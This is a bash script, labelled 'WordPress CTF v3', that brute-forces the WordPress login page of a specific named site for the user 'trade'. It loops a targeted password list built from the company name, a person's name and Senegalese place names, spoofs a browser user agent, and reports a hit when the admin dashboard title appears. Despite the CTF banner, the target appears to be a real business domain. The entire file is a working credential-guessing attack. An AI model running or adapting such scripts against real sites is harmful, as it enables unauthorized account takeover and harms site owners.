#!/bin/bash

PASSWORDS=(
  "cisco" "Cisco" "cisko" "Cisko"
  "trade" "Trade" "Trade123" "trade123"
  "tradeinnovation" "TradeInnovation"
  "innovation" "Innovation123"
  "cissokho" "Cissokho" "cissokho123"
  "admin" "Admin123" "admin123"
  "senegal" "Senegal" "dakar" "Dakar"
  "password" "Password123" "pass123"
  "123456" "12345678" "qwerty"
  "trade2024" "trade2025" "trade2026"
  "cissokho2024" "moustapha" "Moustapha"
  "Trade@sn" "trade@sn" "sn2025"
  "cisco@sn" "cisko@sn" "CiscoSN"
)

TARGET="https://tradeinnovation-sn.com/wp-login.php"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║   WordPress CTF v3 - Détection par titre     ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

for pwd in "${PASSWORDS[@]}"; do
  rm -f /tmp/wp_c.txt
  curl -s -c /tmp/wp_c.txt -H "User-Agent: $UA" "$TARGET" > /dev/null

  TITLE=$(curl -s -X POST "$TARGET" \
    -d "log=trade&pwd=${pwd}&wp-submit=Se+connecter&redirect_to=%2Fwp-admin%2F&testcookie=1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "User-Agent: $UA" \
    -c /tmp/wp_c.txt -b /tmp/wp_c.txt -L \
    | grep -oP '(?<=<title>).*?(?=</title>)')

  echo "[$pwd] → $TITLE"

  if echo "$TITLE" | grep -qi "Tableau de bord\|Dashboard"; then
    echo ""
    echo "╔══════════════════════════════════════════════╗"
    echo "║  ✅  PASSWORD TROUVÉ : $pwd"
    echo "╚══════════════════════════════════════════════╝"
    exit 0
  fi
  sleep 0.4
done

echo "[!] Non trouvé dans cette liste."
